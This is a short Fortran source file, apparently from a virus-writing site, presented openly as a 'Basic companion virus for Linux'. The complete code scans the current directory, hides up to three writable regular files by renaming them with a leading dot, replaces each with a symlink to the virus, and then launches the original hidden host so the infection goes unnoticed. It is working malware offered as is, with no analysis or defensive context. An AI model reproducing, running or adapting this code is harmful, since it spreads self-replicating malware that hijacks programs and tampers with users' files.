C	Basic companion virus for Linux.
C	webmaster@vx.netlux.org'Sep-2004
	program	virus
		external opendir,readdir,closedir
		character*256 n,self
		common self
		call getarg(0,self)		
		call opendir(i)
		if (i.ne.1) then
			call fini
		end if
		j=0
		do while (j.lt.3)
			i = 73
			call readdir(n,i)
			if (i.eq.0) then
				call fini
			end if
			if (n(1:1).ne.'.') then
				i=access(n, 'rw')
				if (i.eq.0) then
					j=j+infect(n)
				end if
			end if
		end do
	end
	subroutine fini
		character*256 name,self
		common self
		j=0
		do i=1,len_trim(self)
			if (self(i:i).eq.'/') then
				j=i
			end if
		end do
		write(name,*)self(1:j),'.',self(j+1:len_trim(self))
		call system(name,j)
		call exit(j)
	end
	integer function infect(n)
		character*256 n,cwd,lnk,self
		integer	ist(13)
		logical IS_REG
		common self
		infect=0
		call getcwd(cwd)
		write(lnk,*)cwd(:len_trim(cwd)),'/',self(:len_trim(self))
		i=access('.'//n, 'r')
		if ((i.ne.0).and.(n(1:2).ne.'FV')) then
			i=lstat(n,ist)
			if ((i.eq.0).and.IS_REG(ist)) then
				call rename(n,'.'//n)
				call symlnk(lnk(2:),n,i)
				infect=1
			end if
		end if
	end
	logical function IS_REG(m)
		integer m(13)
		IS_REG=and(m(3),32768).eq.32768
	end
* EOF
